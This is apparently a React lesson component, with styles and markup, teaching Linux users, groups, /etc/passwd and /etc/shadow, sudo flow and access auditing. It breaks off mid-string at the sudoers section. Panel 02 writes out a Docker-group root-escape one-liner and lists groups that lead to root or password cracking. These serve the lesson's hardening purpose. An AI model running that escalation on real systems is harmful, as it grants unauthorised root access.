import LessonDocument from "./LessonDocument";

const styles = "@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Rajdhani:wght@400;500;600;700&display=swap');\n*{box-sizing:border-box;margin:0;padding:0}\n:root{\n  --bg:#0a0c0f;--bg2:#0d1117;--bg3:#111820;\n  --panel:#131a22;--panel2:#1a2332;\n  --b:#1e3a5f;--b2:#0f2540;\n  --g:#00ff88;--g2:#00cc6a;--c:#00d4ff;\n  --y:#ffd700;--o:#ff8c00;--r:#ff3b3b;\n  --p:#9d4edd;--bl:#2979ff;\n  --t:#c8d8e8;--t2:#7a9bb5;--t3:#4a6a85;\n  --mono:'JetBrains Mono',monospace;\n  --sans:'Rajdhani','Segoe UI',sans-serif;\n}\nbody{background:var(--bg);color:var(--t);font-family:var(--mono);font-size:13px;line-height:1.6;overflow-x:hidden}\nbody::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,136,.01) 2px,rgba(0,255,136,.01) 4px);pointer-events:none;z-index:9999}\n.wrap{max-width:1100px;margin:0 auto;padding:20px 16px}\n/* panels */\n.panel{background:var(--panel);border:1px solid var(--b2);margin-bottom:14px;overflow:hidden}\n.ph{background:var(--panel2);border-bottom:1px solid var(--b);padding:8px 16px;display:flex;align-items:center;gap:10px}\n.pt{font-family:var(--sans);font-size:13px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:var(--c)}\n.pn{margin-left:auto;font-size:10px;color:var(--t3);letter-spacing:1px}\n.pb{padding:18px 20px}\n@keyframes pulse{0%,100%{box-shadow:0 0 6px var(--g)}50%{box-shadow:0 0 18px var(--g);opacity:.5}}\n/* grids */\n.g2{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:14px}\n.g3{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:10px}\n.g4{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px}\n/* concept blocks */\n.cb{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.cbl{border-left:3px solid var(--c)}.cbg{border-left:3px solid var(--g)}.cby{border-left:3px solid var(--y)}.cbp{border-left:3px solid var(--p)}.cbo{border-left:3px solid var(--o)}.cbr{border-left:3px solid var(--r)}\n.cbt{font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px}\n.cbl .cbt{color:var(--c)}.cbg .cbt{color:var(--g)}.cby .cbt{color:var(--y)}.cbp .cbt{color:var(--p)}.cbo .cbt{color:var(--o)}.cbr .cbt{color:var(--r)}\n.ct{color:var(--t);font-size:12.5px;line-height:1.7}\n/* terminal */\n.term{background:#050810;border:1px solid #1a2d45;overflow:hidden}\n.tbar{background:#0d1520;border-bottom:1px solid #1a2d45;padding:7px 14px;display:flex;align-items:center;gap:8px}\n.td{width:10px;height:10px;border-radius:50%}\n.tb{padding:14px 18px;font-size:12px;line-height:1.8}\n.pr{color:var(--g)}\n.sec{display:block;color:var(--t3);font-size:10px;letter-spacing:2px;text-transform:uppercase;border-top:1px solid #1a2d45;padding-top:10px;margin:10px 0 4px}\n.out{display:block;color:var(--t2)}.ocn{display:block;color:var(--c)}.oyn{display:block;color:var(--y)}.orn{display:block;color:var(--o)}.ogn{display:block;color:var(--g)}.ored{display:block;color:var(--r)}.opu{display:block;color:var(--p)}\n/* info/warn/good */\n.info{display:flex;gap:8px;padding:8px 12px;background:rgba(0,212,255,.06);border-left:3px solid var(--c);margin:10px 0;font-size:12px;color:var(--t2)}\n.warn{display:flex;gap:8px;padding:8px 12px;background:rgba(255,215,0,.06);border-left:3px solid var(--y);margin:10px 0;font-size:12px;color:var(--t2)}\n.good{display:flex;gap:8px;padding:8px 12px;background:rgba(0,255,136,.06);border-left:3px solid var(--g);margin:10px 0;font-size:12px;color:var(--t2)}\n.danger{display:flex;gap:8px;padding:8px 12px;background:rgba(255,59,59,.07);border-left:3px solid var(--r);margin:10px 0;font-size:12px;color:var(--t2)}\n/* table */\n.tbl{width:100%;border-collapse:collapse;font-size:12px}\n.tbl th{background:var(--panel2);padding:9px 12px;text-align:left;font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;border-bottom:2px solid var(--b);color:var(--c)}\n.tbl td{padding:8px 12px;border-bottom:1px solid var(--b2);color:var(--t2);vertical-align:top;font-size:12px}\n.tbl td:first-child{color:var(--g);font-family:var(--mono)}\n.tbl tr:hover td{background:rgba(255,255,255,.02)}\n/* tags */\n.tag{padding:2px 8px;border-radius:2px;font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;font-family:var(--sans)}\n.tg{background:rgba(0,255,136,.12);color:var(--g);border:1px solid rgba(0,255,136,.3)}\n.tc{background:rgba(0,212,255,.1);color:var(--c);border:1px solid rgba(0,212,255,.3)}\n.ty{background:rgba(255,215,0,.1);color:var(--y);border:1px solid rgba(255,215,0,.3)}\n.tp{background:rgba(157,78,221,.12);color:var(--p);border:1px solid rgba(157,78,221,.3)}\n.to{background:rgba(255,140,0,.1);color:var(--o);border:1px solid rgba(255,140,0,.3)}\n.tr2{background:rgba(255,59,59,.1);color:var(--r);border:1px solid rgba(255,59,59,.3)}\n/* checklist */\n.cl{list-style:none}\n.cl li{padding:7px 0;border-bottom:1px solid var(--b2);font-size:12.5px;display:flex;align-items:flex-start;gap:10px;color:var(--t2)}\n.chk{width:16px;height:16px;min-width:16px;border:1px solid var(--g);background:rgba(0,255,136,.1);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--g);margin-top:1px;flex-shrink:0}\n/* highlights */\n.hl{color:var(--g);font-weight:600}.hc{color:var(--c)}.hy{color:var(--y)}.ho{color:var(--o)}.hp{color:var(--p)}.hr{color:var(--r)}\n.div{height:1px;background:linear-gradient(to right,transparent,var(--b),transparent);margin:10px 0}\n/* summary */\n.sum-card{background:var(--bg3);border:1px solid var(--b2);padding:14px}\n.sc-l{font-family:var(--sans);font-size:10px;letter-spacing:2px;text-transform:uppercase;font-weight:600;color:var(--t3);margin-bottom:6px}\n.sc-v{font-size:12px;color:var(--t);line-height:1.6}\n.nxt{background:linear-gradient(135deg,rgba(0,255,136,.08),rgba(0,212,255,.05));border:1px solid rgba(0,255,136,.3);padding:14px 18px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:10px;margin-top:14px}\n.nb{background:var(--bg);border:1px solid var(--b);padding:6px 16px;font-size:12px;color:var(--g);cursor:pointer;font-family:var(--mono)}\n.nb:hover{background:rgba(0,255,136,.1);border-color:var(--g)}\n/* uid ranges */\n.uid-band{display:flex;align-items:stretch;margin-bottom:3px}\n.uid-range{width:140px;min-width:140px;font-size:10px;color:var(--t3);display:flex;align-items:center;justify-content:flex-end;padding-right:12px;font-family:var(--mono)}\n.uid-bar{flex:1;padding:8px 12px;border:1px solid;font-family:var(--sans);font-weight:600;font-size:12px}\n/* passwd fields */\n.passwd-field{display:flex;gap:0;font-family:var(--mono);font-size:12px;flex-wrap:wrap;margin:8px 0}\n.pf{padding:6px 10px;border:1px solid var(--b2);text-align:center}\n.pf-sep{padding:6px 4px;color:var(--t3);display:flex;align-items:center}\n.pf-label{font-size:9px;color:var(--t3);font-family:var(--sans);font-weight:600;letter-spacing:1px;text-transform:uppercase;margin-top:3px;text-align:center}\n/* sudo flow */\n.sudo-step{display:flex;gap:12px;align-items:flex-start;margin-bottom:0}\n.sudo-line{position:absolute;left:15px;top:32px;bottom:-10px;width:1px;background:linear-gradient(to bottom,var(--y),transparent)}\n.sudo-dot{width:32px;min-width:32px;height:32px;border-radius:50%;border:2px solid var(--y);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--y);background:rgba(255,215,0,.08);flex-shrink:0;font-family:var(--sans)}\n.sudo-body{flex:1;background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:10px}\n.sudo-title{font-family:var(--sans);font-weight:600;font-size:13px;color:var(--y);margin-bottom:3px}\n.sudo-desc{font-size:11.5px;color:var(--t2)}\n.sudo-cmd{margin-top:5px;background:var(--bg);padding:4px 10px;font-size:11px;color:var(--c);border-left:2px solid var(--c)}\n/* cap grid */\n.cap-card{background:var(--bg3);border:1px solid var(--b2);padding:12px}\n.cap-name{font-family:var(--sans);font-size:11px;font-weight:700;color:var(--c);margin-bottom:4px;letter-spacing:.5px}\n.cap-desc{font-size:11px;color:var(--t2);line-height:1.5}\n.cap-risk{font-size:10px;margin-top:5px;padding:2px 6px;display:inline-block}\n/* pam flow */\n.pam-module{background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;margin-bottom:4px;display:flex;align-items:center;gap:12px}\n.pam-type{width:90px;min-width:90px;font-family:var(--sans);font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase}\n.pam-ctrl{width:80px;min-width:80px;font-family:var(--sans);font-size:10px;font-weight:600}\n.pam-mod{flex:1;color:var(--t);font-size:11px}\n.pam-desc{flex:2;font-size:11px;color:var(--t3)}\n/* privesc chain */\n.pe-chain{display:flex;flex-wrap:wrap;gap:0;align-items:center}\n.pe-box{background:var(--bg3);border:1px solid var(--b2);padding:10px 14px;text-align:center;min-width:130px}\n.pe-title{font-family:var(--sans);font-weight:700;font-size:12px;margin-bottom:3px}\n.pe-sub{font-size:10px;color:var(--t3)}\n.pe-arrow{padding:0 8px;color:var(--r);font-size:20px;font-weight:700}\n/* nsswitch / pam stack */\n.stack-layer{border:1px solid;padding:10px 16px;margin-bottom:3px}";
const markup = "<div class=\"wrap\">\n\n<!-- ═══ HEADER ═══ -->\n<div style=\"background:linear-gradient(135deg,#0d1a2e,#0a1520);border:1px solid var(--b);border-top:3px solid var(--g);padding:20px 24px;margin-bottom:16px;position:relative;overflow:hidden\">\n  <div style=\"position:absolute;right:-60px;top:-60px;width:200px;height:200px;background:radial-gradient(circle,rgba(0,255,136,.05),transparent 70%);pointer-events:none\"></div>\n  <div style=\"display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px\">\n    <div>\n      <div style=\"display:flex;align-items:center;gap:8px;margin-bottom:6px\">\n        <div style=\"width:8px;height:8px;border-radius:50%;background:var(--g);animation:pulse 2s infinite\"></div>\n        <span style=\"font-family:var(--sans);font-size:11px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:var(--g)\">STEP 04 / MODULE 1 ● ACTIVE</span>\n      </div>\n      <h1 style=\"font-family:var(--sans);font-size:26px;font-weight:700;color:#fff;letter-spacing:1px;line-height:1.2\">\n        Linux <span style=\"color:var(--g)\">User, Permission</span> &amp; Access Control\n      </h1>\n      <div style=\"display:flex;flex-wrap:wrap;gap:8px;margin-top:10px\">\n        <span class=\"tag tg\">● Intermediate</span>\n        <span class=\"tag tc\">⊞ Identity & IAM</span>\n        <span class=\"tag ty\">⊛ sudo & PAM</span>\n        <span class=\"tag tp\">⬡ Capabilities</span>\n        <span class=\"tag tr2\">⊕ Privilege Escalation</span>\n      </div>\n    </div>\n    <div style=\"text-align:right;font-size:11px;color:var(--t3);line-height:1.9;font-family:var(--mono)\">\n      <div>MODULE: <span style=\"color:var(--c)\">iam-auth-04</span></div>\n      <div>DEPTH: <span style=\"color:var(--c)\">L5–L7</span></div>\n      <div>PANELS: <span style=\"color:var(--c)\">13</span></div>\n      <div>PREREQ: <span style=\"color:var(--c)\">Step 01–03 ✓</span></div>\n      <div style=\"margin-top:6px;font-size:10px;color:#1e6a3a\">▓▓▓▓▓▓▓▓▓▓ IDENTITY LOADED</div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 01 — USERS & IDENTITY ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">👤</span><span class=\"pt\">Linux Identity Model — Users, UIDs &amp; the /etc/passwd File</span><span class=\"pn\">PANEL 01</span></div>\n  <div class=\"pb\">\n    <div class=\"info\"><span style=\"color:var(--c);flex-shrink:0\">ℹ</span><span>Linux does not know users by name. The kernel identifies every process and file by <strong style=\"color:var(--c)\">numeric UID (User ID)</strong> and <strong style=\"color:var(--c)\">GID (Group ID)</strong>. Names are just a human-readable label — <code>/etc/passwd</code> maps name ↔ UID. This distinction matters for forensics and privilege escalation.</span></div>\n\n    <!-- UID ranges -->\n    <div style=\"margin-bottom:14px\">\n      <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">UID Ranges — Who Is Who</div>\n      <div class=\"uid-band\"><div class=\"uid-range\">0</div><div class=\"uid-bar\" style=\"border-color:rgba(255,59,59,.4);background:rgba(255,59,59,.08);color:var(--r)\">root <span style=\"font-weight:400;font-size:11px;color:var(--t3)\">— UID 0. The only UID the kernel treats as privileged. No DAC restrictions apply. One account.</span></div></div>\n      <div class=\"uid-band\"><div class=\"uid-range\">1 – 999</div><div class=\"uid-bar\" style=\"border-color:rgba(255,215,0,.35);background:rgba(255,215,0,.06);color:var(--y)\">System / Service Accounts <span style=\"font-weight:400;font-size:11px;color:var(--t3)\">— www-data(33), nobody(65534), sshd(74), mysql(27). No login shell. Run daemons.</span></div></div>\n      <div class=\"uid-band\"><div class=\"uid-range\">1000 – 59999</div><div class=\"uid-bar\" style=\"border-color:rgba(0,255,136,.3);background:rgba(0,255,136,.06);color:var(--g)\">Regular Users <span style=\"font-weight:400;font-size:11px;color:var(--t3)\">— Human accounts. Created by useradd. Have home dir, login shell, mail spool.</span></div></div>\n      <div class=\"uid-band\"><div class=\"uid-range\">60000 – 65535</div><div class=\"uid-bar\" style=\"border-color:rgba(0,212,255,.3);background:rgba(0,212,255,.06);color:var(--c)\">Reserved / nobody range <span style=\"font-weight:400;font-size:11px;color:var(--t3)\">— nobody(65534) used for NFS anonymous access and privilege-dropped daemons.</span></div></div>\n    </div>\n\n    <!-- /etc/passwd anatomy -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">/etc/passwd line anatomy</div>\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px;overflow-x:auto\">\n      <div class=\"passwd-field\">\n        <div><div class=\"pf\" style=\"background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.3);color:var(--g)\">alice</div><div class=\"pf-label\">username</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(255,59,59,.08);border-color:rgba(255,59,59,.3);color:var(--r)\">x</div><div class=\"pf-label\">password<br>(in shadow)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(255,215,0,.08);border-color:rgba(255,215,0,.3);color:var(--y)\">1001</div><div class=\"pf-label\">UID</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(0,212,255,.08);border-color:rgba(0,212,255,.3);color:var(--c)\">1001</div><div class=\"pf-label\">primary GID</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(157,78,221,.08);border-color:rgba(157,78,221,.3);color:var(--p)\">Alice Admin</div><div class=\"pf-label\">GECOS<br>(comment)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(255,140,0,.08);border-color:rgba(255,140,0,.3);color:var(--o)\">/home/alice</div><div class=\"pf-label\">home dir</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"background:rgba(0,255,136,.08);border-color:rgba(0,255,136,.3);color:var(--g)\">/bin/bash</div><div class=\"pf-label\">login shell</div></div>\n      </div>\n      <div style=\"font-size:11px;color:var(--t3);margin-top:8px\">\n        ⚠ <strong style=\"color:var(--y)\">Shell field = /bin/false or /usr/sbin/nologin</strong> for service accounts — prevents interactive login even with valid password.\n      </div>\n    </div>\n\n    <!-- /etc/shadow anatomy -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">/etc/shadow line anatomy (root-only readable)</div>\n    <div style=\"background:var(--bg);border:1px solid rgba(255,59,59,.3);padding:14px;margin-bottom:14px;overflow-x:auto\">\n      <div class=\"passwd-field\">\n        <div><div class=\"pf\" style=\"border-color:var(--r);color:var(--g)\">alice</div><div class=\"pf-label\">username</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--r);color:var(--r);font-size:9px\">$6$salt$hash…</div><div class=\"pf-label\">hashed pw<br>(SHA-512)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--t2)\">19479</div><div class=\"pf-label\">last changed<br>(days since epoch)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--t2)\">0</div><div class=\"pf-label\">min age<br>(days)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--y)\">90</div><div class=\"pf-label\">max age<br>(expiry)</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--t2)\">7</div><div class=\"pf-label\">warn days</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--t3)\">!</div><div class=\"pf-label\">inactive<br>grace</div></div>\n        <div class=\"pf-sep\">:</div>\n        <div><div class=\"pf\" style=\"border-color:var(--b2);color:var(--t3)\"></div><div class=\"pf-label\">expire date</div></div>\n      </div>\n      <div style=\"font-size:11px;color:var(--t3);margin-top:8px\">\n        Hash prefix: <span style=\"color:var(--g)\">$6$</span>=SHA-512 (secure), <span style=\"color:var(--y)\">$5$</span>=SHA-256, <span style=\"color:var(--r)\">$1$</span>=MD5 (BROKEN — audit immediately!). \n        <span style=\"color:var(--r)\">!</span> or <span style=\"color:var(--r)\">*</span> prefix = account locked.\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">User management commands</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── CREATE & MANAGE USERS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">useradd -m -s /bin/bash -G sudo,docker -c \"Dev User\" alice</span></span>\n        <span class=\"out\"># -m = create home, -s = shell, -G = supplementary groups</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">passwd alice           # set password</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">usermod -aG developers alice  # add to group</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">userdel -r alice       # delete user + home dir</span></span>\n        <span class=\"sec\">──── CURRENT IDENTITY ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">id</span></span>\n        <span class=\"ocn\">uid=1001(alice) gid=1001(alice) groups=1001(alice),27(sudo),998(docker)</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">whoami && who && w</span></span>\n        <span class=\"out\">alice</span>\n        <span class=\"out\">alice   pts/0  2026-05-03 10:12 (192.168.1.50)</span>\n        <span class=\"sec\">──── PASSWORD POLICY AUDIT ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">chage -l alice</span></span>\n        <span class=\"out\">Last password change       : May 03, 2026</span>\n        <span class=\"oyn\">Maximum number of days    : 90</span>\n        <span class=\"oyn\">Password expires          : Aug 01, 2026</span>\n        <span class=\"sec\">──── FIND USERS WITH EMPTY PASSWORDS (CRITICAL) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '($2 == \"\" ) {print $1}' /etc/shadow</span></span>\n        <span class=\"ored\">testuser   ← no password! lock immediately</span>\n        <span class=\"sec\">──── FIND USERS WITH UID 0 (should only be root) ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">awk -F: '($3 == \"0\") {print $1}' /etc/passwd</span></span>\n        <span class=\"ogn\">root</span>\n        <span class=\"ored\">hacker     ← second UID-0 account! backdoor detected</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 02 — GROUPS ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">👥</span><span class=\"pt\">Groups — Collective Identity &amp; /etc/group</span><span class=\"pn\">PANEL 02</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbg\">\n        <div class=\"cbt\">Primary vs Supplementary Groups</div>\n        <div class=\"ct\">\n          Every process has one <span class=\"hl\">primary GID</span> (from /etc/passwd) and up to 32 <span class=\"hc\">supplementary GIDs</span>. New files created by a process are owned by the process's primary GID.<br><br>\n          Supplementary groups grant additional access. Being in the <span class=\"hy\">sudo</span> group allows sudo. Being in <span class=\"hy\">docker</span> group allows running Docker without sudo (effectively root — audit this!). Being in <span class=\"hy\">adm</span> allows reading logs.\n        </div>\n      </div>\n      <div class=\"cb cby\">\n        <div class=\"cbt\">High-Risk Groups to Audit</div>\n        <div style=\"font-size:12px;color:var(--t2);line-height:1.9\">\n          <span class=\"hr\">sudo / wheel</span> — full root via sudo<br>\n          <span class=\"hr\">docker</span> — mount host FS in container = root<br>\n          <span class=\"hr\">disk</span> — raw disk access (read /dev/sda = read all data)<br>\n          <span class=\"hr\">shadow</span> — read /etc/shadow = crack all passwords<br>\n          <span class=\"hr\">lxd</span> — LXD container = root escape<br>\n          <span class=\"hy\">adm</span> — read system logs (info disclosure)<br>\n          <span class=\"hc\">www-data</span> — web server files (check for secrets in webroot)\n        </div>\n      </div>\n    </div>\n\n    <div style=\"background:var(--bg);border:1px solid var(--b2);padding:14px;margin-bottom:14px\">\n      <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:8px\">/etc/group — group:password:GID:members</div>\n      <div style=\"font-family:var(--mono);font-size:12px;line-height:2\">\n        <div><span style=\"color:var(--r)\">root</span><span style=\"color:var(--t3)\">:x:</span><span style=\"color:var(--y)\">0</span><span style=\"color:var(--t3)\">:</span></div>\n        <div><span style=\"color:var(--o)\">sudo</span><span style=\"color:var(--t3)\">:x:</span><span style=\"color:var(--y)\">27</span><span style=\"color:var(--t3)\">:</span><span style=\"color:var(--g)\">alice,bob</span></div>\n        <div><span style=\"color:var(--r)\">docker</span><span style=\"color:var(--t3)\">:x:</span><span style=\"color:var(--y)\">998</span><span style=\"color:var(--t3)\">:</span><span style=\"color:var(--g)\">alice</span><span style=\"color:var(--r);font-size:11px\"> ← alice in docker group = effective root!</span></div>\n        <div><span style=\"color:var(--p)\">developers</span><span style=\"color:var(--t3)\">:x:</span><span style=\"color:var(--y)\">1050</span><span style=\"color:var(--t3)\">:</span><span style=\"color:var(--g)\">alice,charlie,dave</span></div>\n        <div><span style=\"color:var(--c)\">www-data</span><span style=\"color:var(--t3)\">:x:</span><span style=\"color:var(--y)\">33</span><span style=\"color:var(--t3)\">:</span></div>\n      </div>\n    </div>\n\n    <div class=\"term\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">Group management & audit</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── GROUP OPERATIONS ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">groupadd developers</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">gpasswd -a alice developers   # add alice to group</span></span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">gpasswd -d alice developers   # remove alice from group</span></span>\n        <span class=\"sec\">──── AUDIT: WHO IS IN HIGH-RISK GROUPS? ────</span>\n        <span><span class=\"pr\">root@lab:~# </span><span style=\"color:#fff\">for g in sudo docker disk shadow lxd adm; do echo \"=== $g ===\"; getent group $g; done</span></span>\n        <span class=\"oyn\">=== sudo ===</span>\n        <span class=\"out\">sudo:x:27:alice,bob</span>\n        <span class=\"oyn\">=== docker ===</span>\n        <span class=\"ored\">docker:x:998:alice,jenkins   ← jenkins in docker group? verify this!</span>\n        <span class=\"oyn\">=== disk ===</span>\n        <span class=\"ored\">disk:x:6:bob               ← bob has raw disk access!</span>\n        <span class=\"sec\">──── DOCKER GROUP = ROOT ESCAPE ────</span>\n        <span><span class=\"pr\">alice@lab:~$ </span><span style=\"color:#fff\">docker run -v /:/hostfs -it alpine chroot /hostfs sh</span></span>\n        <span class=\"ored\"># alice now has root shell on host filesystem — not sudo needed!</span>\n        <span class=\"ogn\"># Fix: remove docker group, use rootless Docker or sudo wrapper</span>\n      </div>\n    </div>\n  </div>\n</div>\n\n<!-- ═══ PANEL 03 — ROOT & SUDO ═══ -->\n<div class=\"panel\">\n  <div class=\"ph\"><span style=\"font-size:14px\">⚡</span><span class=\"pt\">root User &amp; sudo — Privilege Elevation Architecture</span><span class=\"pn\">PANEL 03</span></div>\n  <div class=\"pb\">\n    <div class=\"g2\" style=\"margin-bottom:14px\">\n      <div class=\"cb cbr\">\n        <div class=\"cbt\">root (UID 0) — The Superuser</div>\n        <div class=\"ct\">\n          UID 0 is the kernel's definition of privilege. <span class=\"hr\">DAC (Discretionary Access Control) does not apply to UID 0</span> — root can read/write any file, kill any process, bind any port, load kernel modules, change any UID.<br><br>\n          Best practice: <span class=\"hl\">direct root login should be disabled</span>. Use sudo for traceability. Root's actions are logged; unlogged direct root access is a forensic blind spot.<br><br>\n          <span class=\"hy\">Root shell check:</span> <code>cat /etc/passwd | grep \":/bin/bash\"</code> — root should be the only UID-0 with a shell.\n        </div>\n      </div>\n      <div class=\"cb cby\">\n        <div class=\"cbt\">sudo — Controlled Privilege Delegation</div>\n        <div class=\"ct\">\n          sudo lets a user run <span class=\"hy\">specific commands as root</span> (or another user) with full logging to <code>/var/log/auth.log</code> and journald.<br><br>\n          Key concepts:<br>\n          <span class=\"hl\">NOPASSWD:</span> — dangerous, allows passwordless elevation<br>\n          <span class=\"hl\">ALL=(ALL:ALL) ALL</span> — full root (same as root account)<br>\n          <span class=\"hc\">Cmnd_Alias</span> — restrict to specific commands<br>\n          <span class=\"hc\">!command</span> — deny specific command (bypassable!)<br><br>\n          <span class=\"hr\">Never use visudo without understanding the rules. A misconfigured sudoers = game over.</span>\n        </div>\n      </div>\n    </div>\n\n    <!-- sudo execution flow -->\n    <div style=\"font-family:var(--sans);font-size:11px;letter-spacing:2px;color:var(--t3);text-transform:uppercase;margin-bottom:10px\">sudo Execution Flow</div>\n    <div style=\"display:flex;flex-direction:column\">\n      <div class=\"sudo-step\" style=\"position:relative\">\n        <div class=\"sudo-line\"></div>\n        <div class=\"sudo-dot\">1</div>\n        <div class=\"sudo-body\">\n          <div class=\"sudo-title\">User invokes sudo</div>\n          <div class=\"sudo-desc\">alice runs <code>sudo systemctl restart nginx</code>. sudo binary has SUID bit — temporarily runs as root to check policy.</div>\n          <div class=\"sudo-cmd\">$ sudo systemctl restart nginx</div>\n        </div>\n      </div>\n      <div class=\"sudo-step\" style=\"position:relative\">\n        <div class=\"sudo-line\"></div>\n        <div class=\"sudo-dot\">2</div>\n        <div class=\"sudo-body\">\n          <div class=\"sudo-title\">sudoers policy check</div>\n          <div class=\"sudo-desc\">sudo reads <code>/etc/sudoers</code> and <code>/etc/sudoers.d/*</code>. Checks: Is alice listed? Is this command allowed? Is this host matched?</div>\n          <div class=\"sudo-cmd\">alice ALL=(ALL) /usr/bin/systemctl restart nginx</div>\n        </div>\n      </div>\n      <div class=\"sudo-step\" style=\"position:relative\">\n        <div class=\"sudo-line\"></div>\n        <div class=\"sudo-dot\">3</div>\n        <div class=\"sudo-body\">\n          <div class=\"sudo-title\">PAM authentication</div>\n          <div class=\"sudo-desc\">sudo invokes PAM to verify alice's identity — typically password prompt. If alice authenticated within <code>timestamp_timeout</code> (default 15min), skip prompt.</div>\n          <div class=\"sudo-cmd\">[sudo] password for alice: ••••••••</div>\n        </div>\n      </div>\n      <div class=\"sudo-step\" style=\"position:relative\">\n        <div class=\"sudo-line\"></div>\n        <div class=\"sudo-dot\">4</div>\n        <div class=\"sudo-body\">\n          <div class=\"sudo-title\">Audit log written</div>\n          <div class=\"sudo-desc\">Before execution, sudo writes to <code>/var/log/auth.log</code>: who, what command, from where, timestamp. Non-repudiable audit trail.</div>\n          <div class=\"sudo-cmd\">May 03 10:15:22 lab sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx</div>\n        </div>\n      </div>\n      <div class=\"sudo-step\">\n        <div class=\"sudo-dot\">5</div>\n        <div class=\"sudo-body\">\n          <div class=\"sudo-title\">Command executes as root</div>\n          <div class=\"sudo-desc\">sudo forks, sets UID=0, executes the command. On completion, drops back to alice's context. Target process was root only for the duration of the command.</div>\n        </div>\n      </div>\n    </div>\n\n    <!-- sudoers examples -->\n    <div class=\"term\" style=\"margin-top:14px\">\n      <div class=\"tbar\"><div class=\"td\" style=\"background:#ff5f57\"></div><div class=\"td\" style=\"background:#febc2e\"></div><div class=\"td\" style=\"background:#28c840\"></div>\n        <span style=\"margin-left:8px;font-size:11px;color:var(--t3);font-family:var(--sans)\">/etc/sudoers — secure vs dangerous configurations</span></div>\n      <div class=\"tb\">\n        <span class=\"sec\">──── SUDOERS SYNTAX 